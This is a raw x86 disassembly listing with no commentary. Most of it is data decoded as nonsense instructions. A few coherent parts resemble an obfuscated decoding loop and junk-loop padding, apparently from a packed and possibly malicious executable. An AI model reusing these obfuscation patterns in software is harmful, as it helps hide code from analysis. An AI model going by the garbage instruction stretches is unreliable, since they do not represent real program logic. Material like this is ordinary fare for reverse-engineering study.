  40295d:	mov    ds:0x3ed4069,eax
  402962:	loopne 0x4029cd
  402964:	retf   
  402965:	(bad)  
  402966:	cmc    
  402967:	sub    ebp,0x1e
  40296a:	jl     0x402910
  40296c:	das    
  40296d:	cwde   
  40296e:	mov    dh,0x45
  402970:	stc    
  402971:	fld    QWORD PTR [ebx]
  402973:	rcr    BYTE PTR [edx-0x5e],cl
  402976:	icebp  
  402977:	dec    edx
  402978:	sub    cl,ch
  40297a:	inc    esi
  40297b:	pop    ds
  40297c:	gs jecxz 0x402943
  40297f:	dec    esi
  402980:	test   ax,0xc74e
  402984:	push   DWORD PTR [ebx+ebx*2+0x12]
  402988:	pushf  
  402989:	mov    ebp,0x4848191f
  40298e:	(bad)
  402991:	add    al,0xf4
  402993:	out    dx,al
  402994:	fstp   DWORD PTR [ecx-0x61]
  402997:	in     al,0x19
  402999:	dec    ebp
  40299a:	mov    al,ds:0xdc671757
  40299f:	lea    esp,ds:0xdeadc31a
  4029a5:	mov    eax,ds:0xe287dd3b
  4029aa:	test   DWORD PTR ds:0x1534da0b,0xa616e301
  4029b4:	cmp    al,0x83
  4029b6:	xor    eax,0x155be3a7
  4029bb:	mov    esp,DWORD PTR [ecx]
  4029bd:	sub    bh,0x71
  4029c0:	mov    ds:0x20d06a6a,al
  4029c5:	in     al,0x51
  4029c7:	push   ebp
  4029c8:	ds leave 
  4029ca:	(bad)  [ebx+0x40]
  4029cd:	es xchg esp,eax
  4029cf:	je     0x4029e3
  4029d1:	cmp    al,0xdf
  4029d3:	xor    al,0xc9
  4029d5:	jbe    0x40297e
  4029d7:	jmp    0xdf22:0x9a74271f
  4029de:	jmp    0x402963
  4029e0:	sar    ch,0x1c
  4029e3:	push   ebx
  4029e4:	adc    BYTE PTR [bx+si+0x1e],dl
  4029e8:	test   al,0x0
  4029ea:	push   ebx
  4029eb:	cld    
  4029ec:	sti    
  4029ed:	dec    eax
  4029ee:	lods   al,BYTE PTR ds:[esi]
  4029ef:	mov    bl,0x1a
  4029f1:	pushf  
  4029f2:	cdq    
  4029f3:	xor    eax,0x6f9874d9
  4029f8:	xor    DWORD PTR [edx-0x45],0xffffffdb
  4029fc:	hlt    
  4029fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029fe:	rcl    DWORD PTR [ebp-0x56bf087],cl
  402a04:	shr    BYTE PTR [esi+0x1c241e72],1
  402a0a:	push   edi
  402a0b:	sub    eax,ecx
  402a0d:	retf   
  402a0e:	add    edi,DWORD PTR [ebp+0x10]
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0x31fbe680,al
  402a42:	shr    DWORD PTR [eax+0xc],1
  402a45:	jle    0x402ac5
  402a47:	push   ebp
  402a48:	jg     0x402ac8
  402a4a:	jle    0x4029e1
  402a4c:	jge    0x4029ec
  402a4e:	mov    ah,0xef
  402a50:	mov    ebx,0xb1a43e0d
  402a55:	adc    BYTE PTR [ebx-0x30],cl
  402a58:	cmp    DWORD PTR [ebp+0x22],edi
  402a5b:	adc    eax,0x9a8bfb1f
  402a60:	lea    ebp,[edi+0x54]
  402a63:	add    al,BYTE PTR [edi-0x71612856]
  402a69:	mov    bh,0xe9
  402a6b:	xchg   esp,eax
  402a6c:	(bad)  
  402a6d:	(bad)  [ebx+ebx*4+0x1c7e11ff]
  402a74:	gs std 
  402a76:	mov    al,ds:0x18af10d0
  402a7b:	pop    ds
  402a7c:	sbb    BYTE PTR [edx-0x1e],cl
  402a7f:	and    BYTE PTR [edi+0x1ae4f644],bl
  402a85:	in     eax,dx
  402a86:	out    dx,al
  402a87:	add    DWORD PTR [ebp+0x18],ebx
  402a8a:	push   0xf7678253
  402a8f:	dec    edi
  402a90:	pop    ecx
  402a91:	xchg   edx,eax
  402a92:	add    ecx,DWORD PTR [ecx+0x4e70eb44]
  402a98:	jecxz  0x402ae1
  402a9a:	lahf   
  402a9b:	out    0x3,al
  402a9d:	les    ebx,FWORD PTR [edx+0x6d]
  402aa0:	sbb    DWORD PTR gs:[ecx-0x43fc17c2],0xffffff9e
  402aa8:	adc    edx,DWORD PTR [edx-0x4b]
  402aab:	sbb    edi,DWORD PTR [ecx-0x735f2c8e]
  402ab1:	inc    eax
  402ab2:	mov    dh,0xc5
  402ab4:	ror    BYTE PTR [eax+0x309cd75b],cl
  402aba:	test   al,0xd5
  402abc:	(bad)  
  402abd:	lds    edi,FWORD PTR [edx-0x2b7eb98c]
  402ac3:	lock push 0x77
  402ac6:	nop
  402ac7:	dec    edi
  402ac8:	and    eax,DWORD PTR [ebx+0x6b607b39]
  402ace:	mov    dh,0x8b
  402ad0:	loop   0x402a60
  402ad2:	mov    esp,DWORD PTR [ecx]
  402ad4:	jnp    0x402b22
  402ad6:	aam    0x8b
  402ad8:	in     eax,0xd9
  402ada:	loop   0x402a7b
  402adc:	jge    0x402b10
  402ade:	mov    bl,0x6
  402ae0:	lods   eax,DWORD PTR ds:[esi]
  402ae1:	mov    dh,0xbc
  402ae3:	test   BYTE PTR [edx-0x55],0x33
  402ae7:	pop    ds
  402ae8:	cmc    
  402ae9:	addr16 dec ebx
  402aeb:	adc    DWORD PTR [eax-0x60e5129f],ecx
  402af1:	adc    eax,0x385e85b9
  402af6:	loop   0x402b48
  402af8:	(bad)  
  402af9:	push   ebx
  402afa:	in     eax,dx
  402afb:	mov    dl,0x12
  402afd:	adc    BYTE PTR [ebx+0x3306aa40],ch
  402b03:	push   edi
  402b04:	mov    ds:0x1a0a1a,eax
  402b09:	mov    ecx,DWORD PTR [ecx]
  402b0b:	sbb    DWORD PTR [ecx],esp
  402b0d:	jg     0x402b2a
  402b0f:	into   
  402b10:	out    dx,al
  402b11:	mov    bl,0x6f
  402b13:	pop    edi
  402b14:	lods   eax,DWORD PTR ds:[esi]
  402b15:	cmp    ebp,DWORD PTR [edx-0x1cbf7c4a]
  402b1b:	out    0xa2,al
  402b1d:	adc    eax,esi
  402b1f:	push   0xcc639d04
  402b24:	in     al,dx
  402b25:	in     al,dx
  402b26:	lea    edi,[ebx]
  402b28:	cli    
  402b29:	push   eax
  402b2a:	pop    ds
  402b2b:	bound  esp,QWORD PTR [eax-0x2080caf7]
  402b31:	adc    eax,DWORD PTR [edi+0x38e86f2d]
  402b37:	popa   
  402b38:	push   cs
  402b39:	call   FWORD PTR [edi-0x55]
  402b3c:	pop    edx
  402b3d:	lock aaa 
  402b3f:	cmp    BYTE PTR [edi],bh
  402b41:	jmp    0xf2b0:0x1ac77bd2
  402b48:	mov    dl,0xd0
  402b4a:	jmp    0xbd34:0xb7d641a
  402b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b52:	es push 0xabb71216
  402b58:	jmp    0x402b94
  402b5a:	(bad)
  402b5d:	or     al,al
  402b5f:	mov    edi,0x8b4fe7a2
  402b64:	mov    bl,0xd5
  402b66:	add    DWORD PTR [eax+0x3c2017e3],ecx
  402b6c:	pop    ebx
  402b6d:	cmp    al,0xb2
  402b6f:	jb     0x402ba9
  402b71:	mov    eax,0xa35fc1aa
  402b76:	mov    eax,0x3ba9f464
  402b7b:	loope  0x402b5c
  402b7d:	push   ss
  402b7e:	jge    0x402b54
  402b80:	fs pop ss
  402b82:	fidiv  WORD PTR [ecx]
  402b84:	fwait
  402b85:	and    al,0x11
  402b87:	cmp    bh,BYTE PTR [esp+ebx*2-0x57]
  402b8b:	frstor [eax]
  402b8d:	stos   DWORD PTR es:[edi],eax
  402b8e:	jl     0x402b9d
  402b90:	fwait
  402b91:	sti    
  402b92:	jle    0x402b8a
  402b94:	inc    edx
  402b95:	fsubr  st(4),st
  402b97:	mov    eax,0x63438cfd
  402b9c:	mov    ch,0xa3
  402b9e:	addr16 addr16 int 0x43
  402ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ba3:	mov    cl,0x63
  402ba5:	adc    eax,0xae860b37
  402baa:	xchg   edi,eax
  402bab:	mov    ds,ebx
  402bad:	aaa    
  402bae:	mov    DWORD PTR [ecx-0x43f34ff4],eax
  402bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bb5:	scas   eax,DWORD PTR es:[edi]
  402bb6:	in     al,dx
  402bb7:	cmc    
  402bb8:	in     al,dx
  402bb9:	cmp    dl,BYTE PTR [ecx+0x1d8f4368]
  402bbf:	outs   dx,DWORD PTR ds:[esi]
  402bc0:	and    dl,ah
  402bc2:	cmp    al,0x3d
  402bc4:	push   eax
  402bc5:	cwde   
  402bc6:	sahf   
  402bc7:	ds mov esi,0x8d0ea794
  402bcd:	imul   ebp,DWORD PTR [ebx-0xe],0xf87efe60
  402bd4:	sub    esp,edx
  402bd6:	fs pop edx
  402bd8:	xchg   esp,eax
  402bd9:	jp     0x402b63
  402bdb:	adc    BYTE PTR [eax+ecx*2],dl
  402bde:	pushf  
  402bdf:	pop    eax
  402be0:	lds    edi,FWORD PTR [ebp+0x1a]
  402be3:	dec    bp
  402be5:	enter  0x416d,0xc3
  402be9:	out    dx,eax
  402bea:	fistp  DWORD PTR [esi+esi*2+0x5f341a20]
  402bf1:	test   DWORD PTR [edi],0x7a15c862
  402bf7:	jb     0x402c07
  402bf9:	jb     0x402b89
  402bfb:	call   0x258e:0x646806ae
  402c02:	jmp    0x8209f90e
  402c07:	adc    al,BYTE PTR ds:[edi+0x6c]
  402c0b:	in     al,dx
  402c0c:	xchg   edi,eax
  402c0d:	mov    al,ds:0xbff0bf20
  402c12:	loopne 0x402bb3
  402c14:	push   ebx
  402c15:	sbb    DWORD PTR [edx+0x7c],esi
  402c18:	jns    0x402bd0
  402c1a:	push   ss
  402c1b:	fst    DWORD PTR [ebx-0x687254ed]
  402c21:	sahf   
  402c22:	jmp    0x3f9:0x33f59312
  402c29:	dec    BYTE PTR [ebx-0x50f0f78b]
  402c2f:	cli    
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0xcc
  402c6b:	popf   
  402c6c:	add    bl,ah
  402c6e:	dec    edi
  402c6f:	or     bh,BYTE PTR [esi+0x7e]
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c9a
  402c77:	sysret 
  402c79:	cmp    esp,esi
  402c7b:	mov    edi,DWORD PTR [ebx+0xf]
  402c7e:	cmp    al,0x70
  402c80:	mov    ch,0x9d
  402c82:	ret    
  402c83:	or     al,0x51
  402c85:	mov    ds:0xa21bdaee,al
  402c8a:	in     al,dx
  402c8b:	test   BYTE PTR [esi+0x6581c663],cl
  402c91:	push   edi
  402c92:	icebp  
  402c93:	sub    ebx,DWORD PTR [ecx]
  402c95:	push   ebx
  402c96:	push   es
  402c97:	mov    edx,0x3798b95a
  402c9c:	mov    WORD PTR [ecx],fs
  402c9e:	pop    edx
  402c9f:	pushf  
  402ca0:	daa    
  402ca1:	lods   eax,DWORD PTR ds:[esi]
  402ca2:	shl    DWORD PTR ss:[esi],0x3f
  402ca6:	sahf   
  402ca7:	mov    ah,0x5e
  402ca9:	and    DWORD PTR [eax+0x3ce9256],ebp
  402caf:	inc    esi
  402cb0:	cmp    ch,0xc2
  402cb3:	xor    eax,0x3cea6585
  402cb8:	add    BYTE PTR [eax+eiz*1+0x4337f97c],ah
  402cbf:	loop   0x402c76
  402cc1:	retf   
  402cc2:	mov    bl,al
  402cc4:	icebp  
  402cc5:	mov    WORD PTR ds:0x43f4492c,ds
  402ccb:	std    
  402ccc:	pop    ss
  402ccd:	cwde   
  402cce:	mov    ah,0x66
  402cd0:	scas   eax,DWORD PTR es:[edi]
  402cd1:	loopne 0x402d3a
  402cd3:	dec    edi
  402cd4:	rol    DWORD PTR [ecx],0x4a
  402cd7:	icebp  
  402cd8:	or     DWORD PTR [eax+0x32ada7cb],0x44
  402cdf:	xchg   esi,eax
  402ce0:	jns    0x402cd8
  402ce2:	out    dx,al
  402ce3:	and    eax,0x77de6fb5
  402ce8:	data16 ss ins WORD PTR es:[edi],dx
  402cec:	imul   eax,DWORD PTR [ebp+0x1c],0xffffffb1
  402cf0:	loope  0x402d2c
  402cf2:	fcom   QWORD PTR [ecx]
  402cf4:	ja     0x402d58
  402cf6:	pushf  
  402cf7:	push   edx
  402cf8:	jo     0x402c8d
  402cfa:	dec    ebp
  402cfb:	jg     0x402c98
  402cfd:	lahf   
  402cfe:	aad    0x1f
  402d00:	sub    DWORD PTR [edi-0x5e],edx
  402d03:	adc    DWORD PTR [ecx],edi
  402d05:	jnp    0x402d11
  402d07:	mov    dl,ch
  402d09:	mov    esp,0x1cd51f9b
  402d0e:	jns    0x402d5a
  402d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d11:	in     eax,0x4e
  402d13:	and    bh,bl
  402d15:	shl    BYTE PTR [eax],cl
  402d17:	leave  
  402d18:	retf   
  402d19:	jmp    0xdab6bec9
  402d1e:	repnz push ecx
  402d20:	fimul  DWORD PTR [edx-0x56d01b38]
  402d26:	mov    dh,0x1a
  402d28:	inc    edx
  402d29:	mov    esp,0x60c294af
  402d2e:	mov    dl,0xfb
  402d30:	iret   
  402d31:	cmp    dl,dl
  402d33:	inc    edi
  402d34:	into   
  402d35:	add    DWORD PTR [ecx],ecx
  402d37:	mov    dh,0x58
  402d39:	lahf   
  402d3a:	jno    0x402d20
  402d3c:	rcr    DWORD PTR [ebx],cl
  402d3e:	pop    ds
  402d3f:	cld    
  402d40:	sbb    edx,DWORD PTR [ecx+0x31f0b190]
  402d46:	in     al,dx
  402d47:	stos   BYTE PTR es:[edi],al
  402d48:	xchg   BYTE PTR [eax-0x1d],ah
  402d4b:	(bad)  
  402d4c:	adc    DWORD PTR gs:[ebp-0x60],eax
  402d50:	mov    esi,0x8aa56901
  402d55:	pop    edi
  402d56:	xor    eax,0x7d50db96
  402d5b:	push   0xffffffd9
  402d5d:	jae    0x402da5
  402d5f:	shl    DWORD PTR [ecx+ebx*2],0xe8
  402d63:	or     eax,0xf87d2f6a
  402d68:	ss mov ecx,0x9eba0ed5
  402d6e:	loope  0x402d0f
  402d70:	das    
  402d71:	fbstp  TBYTE PTR [esi]
  402d73:	pop    eax
  402d74:	(bad)  
  402d76:	fcom   DWORD PTR [edx+0x4c]
  402d79:	or     al,0x29
  402d7b:	xor    al,0xce
  402d7d:	lea    ebx,[ebx+eiz*2-0x42]
  402d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d82:	push   0xffffffe6
  402d84:	mov    eax,ds:0xec55e4b0
  402d89:	lahf   
  402d8a:	mov    eax,0x7bdb51b7
  402d8f:	xchg   esi,eax
  402d90:	push   es
  402d91:	es daa 
  402d93:	outs   dx,BYTE PTR ds:[esi]
  402d94:	cld    
  402d95:	mov    ?,WORD PTR [eax+0x2f8f5a72]
  402d9b:	mov    eax,esp
  402d9d:	push   cs
  402d9e:	jge    0x402d25
  402da0:	mov    esp,0xc057f2fa
  402da5:	rol    BYTE PTR [ebp+eiz*1-0x7c],cl
  402da9:	jp     0x402ddc
  402dab:	stc    
  402dac:	mov    dh,0xa2
  402dae:	fistp  DWORD PTR [esp+edi*1]
  402db1:	test   bh,dh
  402db3:	or     ebx,esi
  402db5:	outs   dx,BYTE PTR ds:[esi]
  402db6:	aad    0x47
  402db8:	pop    esi
  402db9:	mov    ecx,0xc5c19115
  402dbe:	sub    BYTE PTR [eax-0x46],bh
  402dc1:	ss add eax,0xc2b73cd7
  402dc7:	mov    ah,0xd1
  402dc9:	lock push ebp
  402dcb:	mov    cl,0xad
  402dcd:	mov    BYTE PTR [ebp+0x1cddfb87],cl
  402dd3:	mov    BYTE PTR [ebx+eax*1+0x34e163ae],0xaa
  402ddb:	in     eax,0x4a
  402ddd:	leave  
  402dde:	mov    cl,0xeb
  402de0:	mov    bl,0x87
  402de2:	imul   ebp,eax,0x6e824b33
  402de8:	xchg   BYTE PTR [edi+edi*2-0x74706065],bh
  402def:	adc    al,0x64
  402df1:	sar    DWORD PTR [ebp-0x71d1b762],0x24
  402df8:	push   edx
  402df9:	or     al,0x28
  402dfb:	cmp    DWORD PTR [edi-0x8a9da8f],esi
  402e01:	fisubr DWORD PTR [ebp+0x77]
  402e04:	enter  0x23d,0x76
  402e08:	mov    ds:0x500902ee,al
  402e0d:	adc    al,0x22
  402e0f:	mov    edx,ss
  402e11:	xor    eax,0x57d1e638
  402e16:	pop    ebx
  402e17:	popa   
  402e18:	in     al,0xed
  402e1a:	add    eax,0x98208b82
  402e1f:	pop    ds
  402e20:	ss jnp 0x402dd6
  402e23:	jl     0x402e2e
  402e25:	jo     0x402e1f
  402e27:	xchg   edx,eax
  402e28:	test   DWORD PTR [ebp-0x49],ecx
  402e2b:	dec    eax
  402e2c:	and    BYTE PTR [esi-0x36d8852],dh
  402e32:	xor    BYTE PTR [ebx+0x63],dh
  402e35:	hlt    
  402e36:	mov    WORD PTR [ebx],?
  402e38:	push   eax
  402e39:	pop    edi
  402e3a:	cmp    BYTE PTR [ebp+ebx*8+0x21],ah
  402e3e:	add    eax,0x47863c62
  402e43:	push   0x42
  402e45:	mov    al,ds:0x9fa49875
  402e4a:	out    0xce,eax
  402e4c:	push   ss
  402e4d:	xor    BYTE PTR [eax],al
  402e4f:	mov    bh,0x66
  402e51:	add    esi,DWORD PTR [ebp+0x10]
  402e54:	cmp    edx,esi
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e650,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x4302b5
  402e91:	xor    ecx,DWORD PTR ds:0x42ec53
  402e97:	mov    DWORD PTR ds:0x4302b5,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42ec6f,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42ec6f
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42ec6f,ecx
  402ec9:	cmp    DWORD PTR ds:0x42ec6f,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42ec6f,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42e91b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ec67,0x17
  402efd:	cmp    DWORD PTR ds:0x42ec67,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ec67,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x4302c9
  402f21:	push   0x42e737
  402f26:	call   DWORD PTR ds:0x42e833
  402f2c:	cmp    DWORD PTR ds:0x42ec67,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ec67
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ec67,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ec67
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ec67,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42ec4f,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42ec4f
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42ec4f,ecx
  402f71:	cmp    DWORD PTR ds:0x42ec4f,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x4302ed
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e847
  402f8f:	cmp    DWORD PTR ds:0x42ec4f,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42ec4b,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x4302d5,0x10
  402faf:	cmp    DWORD PTR ds:0x4302d5,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x4302d5,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e6ad
  402fd4:	call   DWORD PTR ds:0x42e84b
  402fda:	cmp    DWORD PTR ds:0x4302d5,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x4302d5
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x4302d5,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x4302d5
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x4302d5,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x4302ed,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e640
  403019:	add    DWORD PTR ds:0x42ec73,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x43035b,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e648,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	mov    BYTE PTR [ecx+0x8a2f2d0],0x7e
  403056:	jle    0x403006
  403058:	jg     0x4030d8
  40305a:	jle    0x40302a
  40305c:	retf   
  40305d:	fs fsub st,st(0)
  403060:	jle    0x4030cf
  403062:	inc    ebp
  403063:	sbb    eax,DWORD PTR [ebx-0x8]
  403066:	ds test esp,ebx
  403069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40306a:	jmp    0x8b9683d2
  40306f:	xchg   ebx,eax
  403070:	clc    
  403071:	rol    BYTE PTR [ebx-0x77],1
  403074:	sbb    bh,BYTE PTR [ebp+0x69]
  403077:	fnstenv ss:[edx-0x7aca2284]
  40307e:	push   0xacbea25b
  403083:	xchg   BYTE PTR [ecx+edi*2-0xf8e0492],bl
  40308a:	js     0x4030e3
  40308c:	push   esp
  40308d:	add    DWORD PTR [edi],edi
  40308f:	int    0x34
  403091:	pop    eax
  403092:	pop    ss
  403093:	fistp  QWORD PTR [esi+ecx*4-0x4023b3e]
  40309a:	es push ds
  40309c:	test   BYTE PTR [esi-0x49],ch
  40309f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030a0:	outs   dx,BYTE PTR ds:[esi]
  4030a1:	inc    esi
  4030a2:	add    BYTE PTR [ebx],bh
  4030a4:	data16 in al,0xd1
  4030a7:	jae    0x4030c0
  4030a9:	push   0xe54f3630
  4030ae:	lods   eax,DWORD PTR ds:[esi]
  4030af:	xor    eax,0x99ad36eb
  4030b4:	pop    es
  4030b5:	shl    BYTE PTR [esi-0x21],0x8
  4030b9:	mov    bh,0x2c
  4030bb:	lods   al,BYTE PTR ds:[esi]
  4030bc:	dec    ebx
  4030bd:	js     0x4030a5
  4030bf:	dec    eax
  4030c0:	test   DWORD PTR ds:0xc29f6eb2,0x9e86aa3e
  4030ca:	repnz dec edi
  4030cc:	popf   
  4030cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030ce:	es js  0x4030c3
  4030d1:	mov    esp,0xa03c08f1
  4030d6:	div    esp
  4030d8:	ins    DWORD PTR es:[edi],dx
  4030d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030da:	pusha  
  4030db:	retf   0x29e1
  4030de:	call   0xaebc:0xdef6ebb9
  4030e5:	push   ecx
  4030e6:	pushf  
  4030e7:	frstor [eax]
  4030e9:	clc    
  4030ea:	xor    al,0xea
  4030ec:	in     eax,0xb9
  4030ee:	add    al,ah
  4030f0:	jns    0x403156
  4030f2:	imul   ebp,DWORD PTR [edi+eiz*1],0xffffff9f
  4030f6:	pop    ecx
  4030f7:	sub    BYTE PTR [ebx],ah
  4030f9:	add    esi,esp
  4030fb:	loope  0x403142
  4030fd:	lds    esi,FWORD PTR [ebx]
  4030ff:	jecxz  0x40315d
  403101:	mov    WORD PTR [eax+ebp*1-0xb],gs
  403105:	xor    eax,eax
  403107:	and    DWORD PTR [esp+edx*8+0x31],esp
  40310b:	or     BYTE PTR [edx],dl
  40310d:	dec    ebp
  40310e:	pop    edi
  40310f:	xchg   BYTE PTR [esi],ch
  403111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403112:	ror    BYTE PTR [esi+eiz*2+0x3a68896],0x19
  40311a:	(bad)  
  40311b:	(bad)  
  40311e:	jge    0x403172
  403120:	addr16 sub eax,0x266147a5
  403126:	lea    ecx,[edx+0x72]
  403129:	sbb    edi,ebx
  40312b:	ds xchg edi,eax
  40312d:	xor    ebx,DWORD PTR [eax-0x2f]
  403130:	into   
  403131:	out    0x9d,eax
  403133:	mov    ebx,ebx
  403135:	or     ebx,esp
  403137:	xchg   edx,eax
  403138:	push   ebp
  403139:	push   esp
  40313a:	mov    edi,0x3af4839c
  40313f:	dec    edx
  403140:	into   
  403141:	(bad)  
  403142:	(bad)  
  403143:	pusha  
  403144:	mov    ch,0xc3
  403146:	or     BYTE PTR [edx],dl
  403148:	push   edi
  403149:	or     edi,DWORD PTR [esp+edx*1-0x12]
  40314d:	inc    edx
  40314e:	int    0xf0
  403150:	inc    eax
  403151:	mov    al,0x32
  403153:	cld    
  403154:	jg     0x40314b
  403156:	popf   
  403157:	mov    eax,ds:0x4ebc3924
  40315c:	jbe    0x4031b0
  40315e:	fstp   DWORD PTR [ebx-0x75db2b84]
  403164:	das    
  403165:	mov    ecx,ecx
  403167:	xchg   esi,eax
  403168:	popf   
  403169:	add    al,0xb7
  40316b:	loop   0x403140
  40316d:	div    DWORD PTR [edx-0x7d81b73]
  403173:	sbb    al,0xb9
  403175:	pop    esp
  403176:	adc    al,0x1f
  403178:	daa    
  403179:	lds    esi,FWORD PTR [ebx+0x5c]
  40317c:	lds    ebx,FWORD PTR [edx]
  40317e:	std    
  40317f:	daa    
  403180:	ins    BYTE PTR es:[edi],dx
  403181:	push   es
  403182:	dec    esp
  403183:	mov    esp,0x9212197d
  403188:	repz sbb ebx,ecx
  40318b:	xor    edx,DWORD PTR [ecx+0x59faae9c]
  403191:	mov    al,0x6e
  403193:	mov    dh,0x15
  403195:	cwde   
  403196:	and    DWORD PTR [edi],ebx
  403198:	and    ah,dl
  40319a:	dec    edi
  40319b:	jb     0x403134
  40319d:	ins    BYTE PTR es:[edi],dx
  40319e:	imul   eax,DWORD PTR [eax],0xbe3abdff
  4031a4:	inc    edi
  4031a5:	lahf   
  4031a6:	push   edi
  4031a7:	xchg   ecx,eax
  4031a8:	jge    0x40321e
  4031aa:	dec    edx
  4031ab:	pop    esp
  4031ac:	repz lahf 
  4031ae:	mov    bh,0x7a
  4031b0:	popf   
  4031b1:	fs jecxz 0x403150
  4031b4:	in     al,dx
  4031b5:	retf   0x3ccc
  4031b8:	scas   eax,DWORD PTR es:[edi]
  4031b9:	in     eax,0xc9
  4031bb:	xor    esp,DWORD PTR [ecx]
  4031bd:	cli    
  4031be:	add    bh,BYTE PTR [esi-0x67b4887c]
  4031c4:	cld    
  4031c5:	test   eax,0x19a8e09
  4031ca:	imul   esi,eax,0xde1243c2
  4031d0:	jge    0x403159
  4031d2:	or     BYTE PTR [edi+0x3823881c],dh
  4031d8:	jp     0x40316f
  4031da:	pop    esi
  4031db:	test   al,0x76
  4031dd:	int    0x74
  4031df:	imul   ecx,DWORD PTR [ecx+0x6c17a6f8],0x1e
  4031e6:	into   
  4031e7:	push   ecx
  4031e8:	fstp   QWORD PTR [ecx-0x1b]
  4031eb:	and    BYTE PTR [ecx],al
  4031ed:	jmp    0x40318a
  4031ef:	rcr    DWORD PTR [edi-0x51],cl
  4031f2:	dec    eax
  4031f3:	int    0x14
  4031f5:	cmp    BYTE PTR [esi-0x37],al
